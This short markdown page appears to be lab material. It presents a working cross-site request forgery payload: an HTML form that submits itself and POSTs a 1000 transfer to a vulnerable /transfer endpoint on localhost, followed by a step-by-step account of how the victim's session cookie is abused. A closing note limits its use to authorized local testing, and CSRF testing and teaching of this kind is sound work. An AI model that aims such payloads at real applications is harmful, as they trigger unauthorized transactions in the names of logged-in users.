# CSRF Exploitation Payloads

## 1. HTML Auto-Submitting Form

The following payload demonstrates how a malicious webpage can automatically submit a POST request to the vulnerable `/transfer` endpoint.

### Payload

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit Demo</title>
</head>
<body>
    <form id="csrfForm"
          action="http://localhost:8081/transfer"
          method="POST">

        <input type="hidden" name="amount" value="1000">

    </form>

    <script>
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```

## 2. How It Works

1. The victim visits the attacker's webpage.
2. The HTML form is submitted automatically.
3. The browser may attach the victim's authentication cookies.
4. The vulnerable server processes the request without CSRF validation.

## Expected Result
If the application is vulnerable and the browser sends the required session cookie, the server may process the unauthorized transfer.

## Security Note
This payload is intended for local testing in an authorized lab environment only.
